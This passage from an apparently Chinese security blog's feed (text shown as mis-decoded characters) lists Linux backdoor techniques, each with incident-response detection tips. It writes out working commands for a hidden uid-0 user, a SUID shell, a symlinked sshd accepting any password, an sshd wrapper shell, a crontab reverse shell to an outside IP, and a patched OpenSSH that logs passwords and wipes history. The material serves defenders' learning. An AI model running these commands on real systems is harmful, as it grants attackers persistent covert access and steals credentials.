&#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest</span><br><span class="line"></span><br><span class="line"># useradd -p æ–¹æ³•  &#96; &#96; æ˜¯ç”¨æ¥å­˜æ”¾å¯æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤,&quot;$()&quot;ä¹Ÿå¯ä»¥å­˜æ”¾å‘½ä»¤æ‰§è¡Œè¯­å¥</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"></span><br><span class="line"># chpasswdæ–¹æ³•</span><br><span class="line">useradd guest;echo &#39;guest:123456&#39;|chpasswd</span><br><span class="line"></span><br><span class="line"># echo -eæ–¹æ³•</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure><p>æ·»åŠ rootç”¨æˆ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„rootç”¨æˆ·</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest -o -u 0 -g root -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test</span><br></pre></td></tr></table></figure><p>å¯ç–‘ç”¨æˆ·æ’æŸ¥æŠ€å·§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·(uid ä¸º0)</span><br><span class="line">[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line"># æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯</span><br><span class="line">[root@localhost ~]# awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line"># é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™</span><br><span class="line">[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br></pre></td></tr></table></figure><p><strong>2ã€SUID Shell</strong></p><p>Suid shellæ˜¯ä¸€ç§å¯ç”¨äºä»¥æ‹¥æœ‰è€…æƒé™è¿è¡Œçš„shellã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é…åˆæ™®é€šç”¨æˆ·æƒé™ä½¿ç”¨</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shell</span><br><span class="line">chmod u+s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨guestç”¨æˆ·ç™»å½•å°±å¯ç–‘è·å–rootæƒé™ã€‚</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-1.png"></p><p>å¤‡æ³¨ï¼šbash2é’ˆå¯¹suidåšäº†ä¸€äº›é˜²æŠ¤æªæ–½ï¼Œéœ€è¦ä½¿ç”¨-på‚æ•°æ¥è·å–ä¸€ä¸ªroot shellã€‚å¦å¤–ï¼Œæ™®é€šç”¨æˆ·æ‰§è¡Œè¿™ä¸ªSUID shellæ—¶ï¼Œä¸€å®šè¦ä½¿ç”¨å…¨è·¯å¾„ã€‚</p><p>æ’æŸ¥æŠ€å·§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># åœ¨Linuxä¸­æŸ¥æ‰¾SUIDè®¾ç½®çš„æ–‡ä»¶</span><br><span class="line">find . -perm &#x2F;4000 </span><br><span class="line"># åœ¨Linuxä¸­æŸ¥æ‰¾ä½¿ç”¨SGIDè®¾ç½®çš„æ–‡ä»¶</span><br><span class="line">find . -perm &#x2F;2000</span><br><span class="line"># å–æ¶ˆsæƒé™</span><br><span class="line">chmod u-s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure><p><strong>3ã€sshå…¬ç§é’¥å…å¯†ç™»å½•</strong></p><p>åœ¨å®¢æˆ·ç«¯ä¸Šç”Ÿæˆä¸€å¯¹å…¬ç§é’¥ï¼Œç„¶åæŠŠå…¬é’¥æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼ˆ~/.ssh/authorized_keysï¼‰ï¼Œä¿ç•™ç§é’¥ã€‚å½“sshç™»å½•æ—¶ï¼Œsshç¨‹åºä¼šå‘é€ç§é’¥å»å’ŒæœåŠ¡å™¨ä¸Šçš„å…¬é’¥åšåŒ¹é…ã€‚å¦‚æœåŒ¹é…æˆåŠŸå°±å¯ä»¥ç™»å½•äº†ã€‚</p><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-2.png"></p><p>è¿›å…¥/root/.ssh/æ–‡ä»¶å¤¹ï¼ŒæŸ¥çœ‹æ–‡ä»¶å¤¹çš„å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-3.png"></p><p>å…¶ä¸­ <code>id_rsa</code>ä¸ºç§é’¥ï¼Œ<code>id_rsa.pub</code>ä¸ºå…¬é’¥ï¼Œæ¥ä¸‹æ¥æ‰“å¼€<code>id_rsa.pub</code>ï¼Œå°†å†…å®¹å¤åˆ¶åˆ°æœåŠ¡å™¨ã€‚å°†<code>id_rsa.pub</code>çš„å†…å®¹è¿½åŠ åˆ°<code>/root/.ssh/authorized_keys</code>å†…ï¼Œé…ç½®å®Œæˆã€‚</p><p>æ’æŸ¥æŠ€å·§ï¼šæŸ¥çœ‹<code>/root/.ssh/authorized_keys</code>æ˜¯å¦è¢«ä¿®æ”¹ã€‚</p><p><strong>4ã€è½¯è¿æ¥</strong></p><p>åœ¨sshdæœåŠ¡é…ç½®è¿è¡ŒPAMè®¤è¯çš„å‰æä¸‹ï¼ŒPAMé…ç½®æ–‡ä»¶ä¸­æ§åˆ¶æ ‡å¿—ä¸ºsufficientæ—¶åªè¦pam_rootokæ¨¡å—æ£€æµ‹uidä¸º0å³rootæƒé™å³å¯æˆåŠŸè®¤è¯ç™»é™†ã€‚é€šè¿‡è½¯è¿æ¥çš„æ–¹å¼ï¼Œå®è´¨ä¸ŠPAMè®¤è¯æ˜¯é€šè¿‡è½¯è¿æ¥çš„æ–‡ä»¶å <code>/tmp/su</code> åœ¨<code>/etc/pam.d/</code>ç›®å½•ä¸‹å¯»æ‰¾å¯¹åº”çš„PAMé…ç½®æ–‡ä»¶(å¦‚: /etc/pam.d/su)ï¼Œä»»æ„å¯†ç ç™»é™†çš„æ ¸å¿ƒæ˜¯<code>auth sufficient pam_rootok.so</code>ï¼Œæ‰€ä»¥åªè¦PAMé…ç½®æ–‡ä»¶ä¸­åŒ…å«æ­¤é…ç½®å³å¯SSHä»»æ„å¯†ç ç™»é™†ï¼Œé™¤äº†suä¸­ä¹‹å¤–è¿˜æœ‰chshã€chfnåŒæ ·å¯ä»¥ã€‚</p><p>åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä¸€å¥è¯åé—¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;8888</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œä¹‹åï¼Œä»»ä½•ä¸€å°æœºå™¨<code>ssh root@IP -p 8888</code>ï¼Œè¾“å…¥ä»»æ„å¯†ç ï¼ŒæˆåŠŸç™»å½•ã€‚</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-4.png"></p><p>æ’æŸ¥æŠ€å·§ï¼šè¿›ç¨‹ã€ç«¯å£éƒ½å¯ä»¥å‘ç°å¼‚å¸¸ï¼Œ kill -s 9 PID ç»“æŸè¿›ç¨‹å³å¯æ¸…é™¤åé—¨ã€‚</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-4-1.png"></p><p><strong>5ã€SSH wrapper</strong></p><p>é¦–å…ˆå¯åŠ¨çš„æ˜¯/usr/sbin/sshd,è„šæœ¬æ‰§è¡Œåˆ°getpeernameè¿™é‡Œçš„æ—¶å€™ï¼Œæ­£åˆ™åŒ¹é…ä¼šå¤±è´¥ï¼Œäºæ˜¯æ‰§è¡Œä¸‹ä¸€å¥ï¼Œå¯åŠ¨/usr/bin/sshdï¼Œè¿™æ˜¯åŸå§‹sshdã€‚åŸå§‹çš„sshdç›‘å¬ç«¯å£å»ºç«‹äº†tcpè¿æ¥åï¼Œä¼šforkä¸€ä¸ªå­è¿›ç¨‹å¤„ç†å…·ä½“å·¥ä½œã€‚è¿™ä¸ªå­è¿›ç¨‹ï¼Œæ²¡æœ‰ä»€ä¹ˆæ£€éªŒï¼Œè€Œæ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿé»˜è®¤çš„ä½ç½®çš„/usr/sbin/sshdï¼Œè¿™æ ·å­æ§åˆ¶æƒåˆå›åˆ°è„šæœ¬äº†ã€‚æ­¤æ—¶å­è¿›ç¨‹æ ‡å‡†è¾“å…¥è¾“å‡ºå·²è¢«é‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œgetpeernameèƒ½çœŸçš„è·å–åˆ°å®¢æˆ·ç«¯çš„TCPæºç«¯å£ï¼Œå¦‚æœæ˜¯19526å°±æ‰§è¡Œshç»™ä¸ªshell</p><p>ç®€å•ç‚¹å°±æ˜¯ä»sshd forkå‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œå¹¶å¯¹è¿è¿‡æ¥çš„å®¢æˆ·ç«¯ç«¯å£è¿›è¡Œäº†åˆ¤æ–­ã€‚</p><p>æœåŠ¡ç«¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377</span><br><span class="line"></span><br><span class="line">#å¦‚æœä½ æƒ³ä¿®æ”¹æºç«¯å£ï¼Œå¯ä»¥ç”¨pythonçš„structæ ‡å‡†åº“å®ç°ã€‚å…¶ä¸­x00x00LFæ˜¯19526çš„å¤§ç«¯å½¢å¼ï¼Œä¾¿äºä¼ è¾“å’Œå¤„ç†ã€‚</span><br><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; buffer &#x3D; struct.pack(&#39;&gt;I6&#39;,19526)</span><br><span class="line">&gt;&gt;&gt; print repr(buffer)</span><br><span class="line">&#39;\x00\x00LF&#39;</span><br><span class="line">&gt;&gt;&gt; buffer &#x3D; struct.pack(&#39;&gt;I6&#39;,13377)</span><br><span class="line">&gt;&gt;&gt; print buffer</span><br><span class="line">4A</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-5.png"></p><p>æ’æŸ¥æŠ€å·§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ls -al &#x2F;usr&#x2F;sbin&#x2F;sshd</span><br><span class="line"># cat &#x2F;usr&#x2F;sbin&#x2F;sshd</span><br><span class="line">å¯é€šè¿‡é‡è£…sshæœåŠ¡æ¢å¤ã€‚</span><br></pre></td></tr></table></figure><p><strong>6ã€straceåé—¨</strong></p><p>é€šè¿‡å‘½ä»¤æ›¿æ¢åŠ¨æ€è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·sshã€suã€sudoçš„æ“ä½œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source &#x2F;root&#x2F;.bashrc</span><br></pre></td></tr></table></figure><p><strong>7ã€crontabåå¼¹shell</strong></p><p>crontabå‘½ä»¤ç”¨äºè®¾ç½®å‘¨æœŸæ€§è¢«æ‰§è¡Œçš„æŒ‡ä»¤ã€‚æ–°å»ºshellè„šæœ¬ï¼Œåˆ©ç”¨è„šæœ¬è¿›è¡Œåå¼¹ã€‚</p><p>aã€åˆ›å»ºshellè„šæœ¬ï¼Œä¾‹å¦‚åœ¨/etc/evil.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.28.131&#x2F;12345  0&gt;&amp;1</span><br><span class="line">chmod +sx &#x2F;etc&#x2F;evil.sh</span><br></pre></td></tr></table></figure><p>bã€crontab -e è®¾ç½®å®šæ—¶ä»»åŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#æ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</span><br><span class="line">*&#x2F;1 * * * * root &#x2F;etc&#x2F;evil.sh</span><br></pre></td></tr></table></figure><p><strong>8ã€opensshåé—¨</strong></p><p>åˆ©ç”¨opensshåé—¨ï¼Œè®¾ç½®SSHåé—¨å¯†ç åŠrootå¯†ç è®°å½•ä½ç½®ï¼Œéšè”½æ€§è¾ƒå¼ºï¼Œä¸æ˜“è¢«å‘ç°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">aã€å¤‡ä»½SSHé…ç½®æ–‡ä»¶</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old</span><br><span class="line"></span><br><span class="line">bã€è§£å‹å¹¶å®‰è£…è¡¥ä¸</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff  &#x2F;openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line"></span><br><span class="line">cã€è®°å½•ç”¨æˆ·åå’Œå¯†ç çš„æ–‡ä»¶ä½ç½®åŠå…¶å¯†ç </span><br><span class="line">vi  includes.h</span><br><span class="line">    #define ILOG &quot;&#x2F;tmp&#x2F;1.txt&quot;             &#x2F;&#x2F;è®°å½•ç™»å½•æœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç </span><br><span class="line">    #define OLOG &quot;&#x2F;tmp&#x2F;2.txt&quot;             &#x2F;&#x2F;è®°å½•æœ¬æœºç™»å½•è¿œç¨‹çš„ç”¨æˆ·åå’Œå¯†ç </span><br><span class="line">    #define SECRETPW &quot;123456789&quot;          &#x2F;&#x2F;åé—¨çš„å¯†ç </span><br><span class="line"></span><br><span class="line">dã€ä¿®æ”¹ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">vi version.h</span><br><span class="line">    #define SSH_VERSION &quot;å¡«å…¥ä¹‹å‰è®°ä¸‹æ¥çš„ç‰ˆæœ¬å·,ä¼ªè£…åŸç‰ˆæœ¬&quot;</span><br><span class="line">    #define SSH_PORTABLE &quot;å°ç‰ˆæœ¬å·&quot;</span><br><span class="line"></span><br><span class="line">eã€å®‰è£…å¹¶ç¼–è¯‘</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc&#x2F;ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">fã€å¯¹æ¯”åŸæ¥çš„é…ç½®æ–‡ä»¶ï¼Œä½¿é…ç½®æ–‡ä»¶ä¸€è‡´ï¼Œç„¶åä¿®æ”¹æ–‡ä»¶æ—¥æœŸã€‚</span><br><span class="line"></span><br><span class="line">touch -r  &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old &#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">touch -r  &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line">gã€æ¸…é™¤æ“ä½œè®°å½•</span><br><span class="line">export HISTFILE&#x3D;&#x2F;dev&#x2F;null</span><br><span class="line">export HISTSIZE&#x3D;0</span><br><span class="line">echo &gt;&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;æ¸…ç©ºæ“ä½œæ—¥å¿—</span><br></pre></td></tr></table></figure><p>æ’æŸ¥æŠ€å·§ï¼šåˆ©ç”¨straceæ‰¾å‡ºsshåé—¨.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 1ã€è·å–å¯ç–‘è¿›ç¨‹PI</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2ã€è·Ÿè¸ªsshd PID</span><br><span class="line">strace -o aa -ff -p  PID</span><br><span class="line"># 3ã€æŸ¥çœ‹è®°å½•å¯†ç æ‰“å¼€æ–‡ä»¶</span><br><span class="line">grep open sshd* | grep -v -e No -e  null -e denied| grep  WR</span><br></pre></td></tr></table></figure><p><strong>9ã€PAMåé—¨</strong></p><p>PAM ï¼ˆPluggable Authentication Modules ï¼‰æ˜¯ç”±Sunæå‡ºçš„ä¸€ç§è®¤è¯æœºåˆ¶ã€‚å®ƒé€šè¿‡æä¾›ä¸€äº›åŠ¨æ€é“¾æ¥åº“å’Œä¸€å¥—ç»Ÿä¸€çš„APIï¼Œå°†ç³»ç»Ÿæä¾›çš„æœåŠ¡å’Œè¯¥æœåŠ¡çš„è®¤è¯æ–¹å¼åˆ†å¼€ï¼Œä½¿å¾—ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥çµæ´»åœ°æ ¹æ®éœ€è¦ç»™ä¸åŒçš„æœåŠ¡é…ç½®ä¸åŒçš„è®¤è¯æ–¹å¼è€Œæ— éœ€æ›´æ”¹æœåŠ¡ç¨‹åºï¼ŒåŒæ—¶ä¹Ÿä¾¿äºå‘ç³»ç»Ÿä¸­æ·»åŠ æ–°çš„è®¤è¯æ‰‹æ®µã€‚PAMæœ€åˆæ˜¯é›†æˆåœ¨Solarisä¸­ï¼Œç›®å‰å·²ç§»æ¤åˆ°å…¶å®ƒç³»ç»Ÿä¸­ï¼Œå¦‚Linuxã€SunOSã€HP-UX 9.0ç­‰ã€‚</p><p>åˆ©ç”¨æ–¹æ³•:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1ã€è·å–ç›®æ ‡ç³»ç»Ÿæ‰€ä½¿ç”¨çš„PAMç‰ˆæœ¬ï¼Œä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„pamç‰ˆæœ¬</span><br><span class="line">2ã€è§£å‹ç¼©ï¼Œä¿®æ”¹pam_unix_auth.cæ–‡ä»¶ï¼Œæ·»åŠ ä¸‡èƒ½å¯†ç </span><br><span class="line">3ã€ç¼–è¯‘å®‰è£…PAM</span><br><span class="line">4ã€ç¼–è¯‘å®Œåçš„æ–‡ä»¶åœ¨ï¼šmodules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.soï¼Œå¤åˆ¶åˆ°&#x2F;lib64&#x2F;securityä¸­è¿›è¡Œæ›¿æ¢ï¼Œå³å¯ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»é™†ï¼Œå¹¶å°†ç”¨æˆ·åå¯†ç è®°å½•åˆ°æ–‡ä»¶ä¸­ã€‚</span><br></pre></td></tr></table></figure><p>æ’æŸ¥æŠ€å·§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1ã€é€šè¿‡Straceè·Ÿè¸ªssh</span><br><span class="line">ps axu | grep sshd</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"># 2ã€æ£€æŸ¥pam_unix.soçš„ä¿®æ”¹æ—¶é—´</span><br><span class="line">stat &#x2F;lib&#x2F;security&#x2F;pam_unix.so      #32ä½</span><br><span class="line">stat &#x2F;lib64&#x2F;security&#x2F;pam_unix.so    #64ä½</span><br></pre></td></tr></table></figure><p><strong>10ã€rookitåé—¨</strong></p><p>Mafixæ˜¯ä¸€æ¬¾å¸¸ç”¨çš„è½»é‡åº”ç”¨çº§åˆ«Rootkitsï¼Œæ˜¯é€šè¿‡ä¼ªé€ sshåè®®æ¼æ´å®ç°è¿œç¨‹ç™»é™†çš„ç‰¹ç‚¹æ˜¯é…ç½®ç®€å•å¹¶å¯ä»¥è‡ªå®šä¹‰éªŒè¯å¯†ç å’Œç«¯å£å·ã€‚</p><p>åˆ©ç”¨æ–¹æ³•ï¼šå®‰è£…å®Œæˆåï¼Œä½¿ç”¨ssh ç”¨æˆ·@IP -P é…ç½®çš„ç«¯å£ï¼Œå³å¯è¿œç¨‹ç™»å½•ã€‚</p><p>æ’æŸ¥æŠ€å·§ï¼šæŸ¥çœ‹ç«¯å£æ˜¯å¦å¼‚å¸¸ï¼ŒRPM checkæŸ¥çœ‹å‘½ä»¤æ˜¯å¦è¢«æ›¿æ¢ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p>LINUXçš„ä¸¤ç§åé—¨æ€»ç»“(suid shellä¸inetd)</p><p><a href="https://www.cnblogs.com/milantgh/p/3601812.html">https://www.cnblogs.com/milantgh/p/3601812.html</a></p><p>linuxåé—¨æ€»ç»“</p><p><a href="https://www.cnblogs.com/zaqzzz/p/12099463.html">https://www.cnblogs.com/zaqzzz/p/12099463.html</a></p><p><a href="https://www.secpulse.com/archives/100484.html">https://www.secpulse.com/archives/100484.html</a></p><p>linuxå„ç§ä¸€å¥è¯åå¼¹shellæ€»ç»“</p><p><a href="https://yq.aliyun.com/articles/519250?type=2">https://yq.aliyun.com/articles/519250?type=2</a></p><p>Linux OpenSSHåé—¨çš„æ·»åŠ ä¸é˜²èŒƒ</p><p><a href="https://yq.aliyun.com/articles/69350">https://yq.aliyun.com/articles/69350</a></p><p>Linuxåé—¨æ•´ç†åˆé›†</p><p><a href="https://www.cnblogs.com/maplered/p/9224617.html">https://www.cnblogs.com/maplered/p/9224617.html</a></p><p><a href="https://www.cnblogs.com/zlgxzswjy/p/6209571.html">https://www.cnblogs.com/zlgxzswjy/p/6209571.html</a></p><p>linux åé—¨</p><p><a href="https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/">https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/</a></p><h1 id="Linux-å®æˆ˜"><a href="#Linux-å®æˆ˜" class="headerlink" title="Linux å®æˆ˜"></a>Linux å®æˆ˜</h1><p><a href="https://bypass007.github.io/Emergency-Response-Notes/Linux/">https://bypass007.github.io/Emergency-Response-Notes/Linux/</a></p><p>å…¶ä»–å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://mp.weixin.qq.com/s/qjM7Fh0u0Edsz5C7L_ErGQ">https://mp.weixin.qq.com/s/qjM7Fh0u0Edsz5C7L_ErGQ</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;å‰è¨€ï¼š2020å¹´æœŸé—´æœ‰å¹¸å‚åŠ äº†æŠ¤ç½‘ï¼Œå®¢æˆ·åœ¨æ¼”ä¹ é˜¶æ®µå‡ºç°äº†ä¸€æ¬¡åº”æ€¥äº‹ä»¶ï¼ŒWindowsçš„é‚®ä»¶æœåŠ¡å™¨å‡ºç°äº†ä¸€ä¸ªéšè—ç”¨æˆ·å¼‚åœ°ç™»å½•â€¦â€¦ å½“æ—¶å®¢æˆ·æœ‰ç‚¹æƒ…ç»ªï¼ŒåŠ ä¹‹æˆ‘ä»¬è¿™è¾¹ç¡®å®éƒ½æ˜¯æ“…é•¿æ¸—é€ã€æŒ–æ´çš„å¸ˆå‚…ä»¬ï¼Œæ‰€ä»¥åº”æ€¥çš„æ—¶å€™æ˜¾å¾—å¾ˆé™Œç”Ÿï¼Œæ‰‹å¿™è„šä¹±ï¼Œç”šè‡³å¯ä»¥è¯´å¾ˆä¸šä½™ã€‚äºæ˜¯</summary>
      
    
    
    
    
    <category term="Linuxåº”æ€¥å“åº”" scheme="https://hack-for.fun/tags/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>CTF - æ–‡ä»¶åŒ…å«</title>
    <link href="https://hack-for.fun/7881c78e.html"/>
    <id>https://hack-for.fun/7881c78e.html</id>
    <published>2020-09-02T16:40:30.000Z</published>
    <updated>2020-09-05T13:26:04.114Z</updated>
    
